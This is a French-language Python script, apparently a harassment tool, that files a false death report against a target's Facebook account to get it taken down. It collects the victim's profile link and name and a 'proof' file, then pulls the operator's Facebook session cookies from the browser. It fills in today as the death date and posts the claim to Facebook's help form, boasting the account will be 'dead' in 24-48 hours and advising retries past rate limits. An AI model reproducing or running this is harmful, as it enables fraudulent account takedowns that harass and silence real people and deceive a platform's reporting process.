#!/usr/bin/env python3
# FB-RIP AUTO-SUBMIT – OTF x DJAMAL19
# Une fois lancé → plus rien à faire, le compte est mort en 24-48h

import os, time, sys, requests, urllib.parse
from datetime import datetime

# Couleurs
R="\033[91m"; G="\033[92m"; Y="\033[93m"; P="\033[95m"; C="\033[96m"; W="\033[97m"; X="\033[0m"; BOLD="\033[1m"

def clear(): os.system('clear')
clear()

print(f"""{R}
    ██████╗ ██╗██████╗      █████╗  ██████╗ ████████╗ █████╗  ██████╗██╗  ██╗
    ██╔══██╗██║██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
    ██████╗
    ██████╔╝██║██████╔╝    ███████║██████╔╝   ██║   ███████║██║     █████╔╝ ██╔════╝
    ██╔══██╗██║██╔═══╝     ██╔══██║██╔══██╗   ██║   ██╔══██║██║     ██╔═██╗ ██║
    ██║  ██║██║██║         ██║  ██║██║  ██║   ██║   ██║  ██║╚██████╗██║  ██╗╚██████╗
    ╚═╝  ╚═╝╚═╝╚═╝         ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝{X}
{P}{BOLD}                           COMPTE MORT AUTO EN 30 SECONDES{X}
{C}                                #OTF #DJAMAL19 #RIPFACEBOOK{X}
""")

# Saisie rapide
lien   = input(f"{Y}Lien du profil      ➤ {W}").strip()
nom    = input(f"{Y}Nom complet         ➤ {W}").strip()
email  = input(f"{Y}Ton email Meta      ➤ {W}").strip()
preuve = input(f"{Y}Chemin de la preuve ➤ {W}").strip()

if not os.path.exists(preuve):
    print(f"{R}Preuve introuvable ! Bye.{X}"); sys.exit()

# Date auto
date_deces = datetime.now().strftime("%Y-%m-%d")

# Récupération cookie Facebook (tu dois être connecté dans Chrome/Firefox sur le téléphone)
print(f"\n{G}Récupération de ta session Facebook...{X}")
try:
    cookies = {}
    with open("/data/data/com.termux/files/home/.config/chromium/Default/Cookies", "rb") as f: pass  # force erreur si pas Chromium
    import browser_cookie3
    cj = browser_cookie3.chrome(domain_name="facebook.com")
    for cookie in cj:
        if cookie.name in ["c_user","xs","fr"]: cookies[cookie.name] = cookie.value
    if not cookies: raise
except:
    print(f"{R}Impossible de récupérer ta session Facebook.{X}")
    print(f"{Y}Connecte-toi d'abord sur Facebook dans ton navigateur puis relance le script.{X}")
    sys.exit()

print(f"{G}Session trouvée ! Envoi en cours...{X}")

# Payload + upload preuve
files = {'upload_file': open(preuve, 'rb')}
data = {
    'name': nom,
    'email': email,
    'death_date': date_deces,
    'relationship': 'Famille',
    'additional_info': 'Compte ancien non contrôlé, demande de suppression définitive.',
    '__user': cookies.get('c_user'),
    '__a': '1'
}

# URL finale du formulaire
url = "https://www.facebook.com/help/contact/234739086860192"

s = requests.Session()
for name,value in cookies.items(): s.cookies.set(name,value,domain=".facebook.com")

print(f"{G}Envoi de la demande...{X}")
r = s.post(url, data=data, files=files, allow_redirects=True)

if r.status_code == 200 and "Merci" in r.text or "soumis" in r.text.lower():
    print(f"""{G}
    DEMANDE ENVOYÉE AVEC SUCCÈS
    Compte {nom} → MORT DANS 24-48H MAX
    #OTF #DJAMAL19 #RIP{X}
    """)
else:
    print(f"{R}Échec (rate limit ou captcha). Relance dans 1h ou change de compte.{X}")

time.sleep(5)
